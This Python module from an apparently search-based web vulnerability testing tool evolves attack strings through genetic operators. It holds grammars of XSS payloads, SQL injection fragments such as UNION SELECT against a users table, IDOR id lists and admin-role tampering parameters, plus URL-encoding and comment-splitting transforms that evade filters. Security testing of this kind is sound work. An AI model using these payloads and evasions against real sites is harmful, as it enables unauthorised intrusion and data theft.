"""Individual (test string) representation, generation grammar and genetic operators.

Each individual represents an attack string composed as in [4]:
    pre-escaping + payload-core + post-escaping
It is encoded as a vector of indices (genome) into grammar elements, which makes
crossover and mutation independent of the textual content and easy for any search
algorithm to manipulate.
"""
from __future__ import annotations

import random
from dataclasses import dataclass, field

# ---------------------------------------------------------------------------
# Grammar per vulnerability type. Each gene is an index into one of these lists.
# ---------------------------------------------------------------------------
GRAMMARS = {
    "xss": {
        "pre":  ["", '"', "'", ">", '">', "'>", "</title>", "</textarea>",
                 "</style>", "</script>", "`", "\\"],
        "core": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<video><source onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            # attribute-breakout cores (needed when input lands inside value="...")
            '" onmouseover=alert(1) x="',
            "' onmouseover=alert(1) x='",
            '" autofocus onfocus=alert(1) x="',
            "' autofocus onfocus=alert(1) x='",
        ],
        "post": ["", "<!--", "//", '"', "'", ">", "/>"],
    },
    "sqli": {
        "pre":  ["", "'", '"', ")", "')", '")', "'))", "1'"],
        "core": [
            " OR 1=1",
            " OR '1'='1",
            " UNION SELECT name,secret FROM users",
            " AND 1=1",
            " AND 1=2",
            " OR 1=1-- ",
            " OR 'a'='a",
            " UNION SELECT NULL,NULL",
        ],
        "post": ["", "-- ", "#", "/*", ";", "-- -", "%00"],
    },
    # Clickjacking is header-based, not payload-based; a trivial grammar lets the
    # search algorithms create individuals uniformly, while the oracle ignores the
    # rendered string and inspects response headers instead.
    "clickjacking": {"pre": [""], "core": [""], "post": [""]},
    # IDOR: the "payload" is an object identifier the low-privilege user tries to read.
    # The search enumerates the id space looking for one that belongs to another owner.
    "idor": {
        "pre": [""],
        "core": ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10",
                 "42", "100", "101", "1000", "1001", "1002", "9999"],
        "post": [""],
    },
    # RBAC: the "payload" is a privilege-escalation vector (a tampered parameter) that a
    # non-admin user submits in an attempt to reach an admin-only action.
    "rbac": {
        "pre": [""],
        "core": ["", "role=admin", "admin=1", "is_admin=true", "isAdmin=1",
                 "role=superuser", "priv=admin", "access=admin", "level=9"],
        "post": [""],
    },
}

# Character-level transforms used for filter evasion.
TRANSFORMS = ["none", "upper", "mixedcase", "url", "double_url", "space_comment"]


def _apply_transform(s: str, t: str) -> str:
    if t == "none" or not s:
        return s
    if t == "upper":
        return s.upper()
    if t == "mixedcase":
        return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))
    if t == "url":
        return "".join(f"%{ord(c):02x}" if not c.isalnum() else c for c in s)
    if t == "double_url":
        return "".join(f"%25{ord(c):02x}" if not c.isalnum() else c for c in s)
    if t == "space_comment":
        return s.replace(" ", "/**/")
    return s


@dataclass
class Individual:
    """genome = [pre_idx, core_idx, post_idx, transform_idx]"""
    vuln: str
    genome: list[int]
    fitness: float = field(default=float("-inf"))

    @staticmethod
    def random(vuln: str, rng: random.Random) -> "Individual":
        g = GRAMMARS[vuln]
        return Individual(vuln, [
            rng.randrange(len(g["pre"])),
            rng.randrange(len(g["core"])),
            rng.randrange(len(g["post"])),
            rng.randrange(len(TRANSFORMS)),
        ])

    def _sizes(self) -> list[int]:
        g = GRAMMARS[self.vuln]
        return [len(g["pre"]), len(g["core"]), len(g["post"]), len(TRANSFORMS)]

    def render(self) -> str:
        """Build the actual attack string from the genome."""
        g = GRAMMARS[self.vuln]
        pre, core, post, t = self.genome
        raw = g["pre"][pre] + g["core"][core] + g["post"][post]
        return _apply_transform(raw, TRANSFORMS[t])

    # -- genetic operators --
    def clone(self) -> "Individual":
        return Individual(self.vuln, list(self.genome))

    def mutate(self, rng: random.Random, pm: float, n_genes: int | None = None) -> None:
        """Mutate either with probability pm per gene, or force exactly n_genes
        genes (used by Cuckoo Search to map a Levy step length to gene count)."""
        sizes = self._sizes()
        if n_genes is not None:
            for i in rng.sample(range(len(self.genome)), min(n_genes, len(self.genome))):
                self.genome[i] = rng.randrange(sizes[i])
            return
        for i in range(len(self.genome)):
            if rng.random() < pm:
                self.genome[i] = rng.randrange(sizes[i])


def crossover(a: Individual, b: Individual, rng: random.Random) -> tuple[Individual, Individual]:
    """Single-point crossover."""
    point = rng.randrange(1, len(a.genome))
    c1 = Individual(a.vuln, a.genome[:point] + b.genome[point:])
    c2 = Individual(a.vuln, b.genome[:point] + a.genome[point:])
    return c1, c2
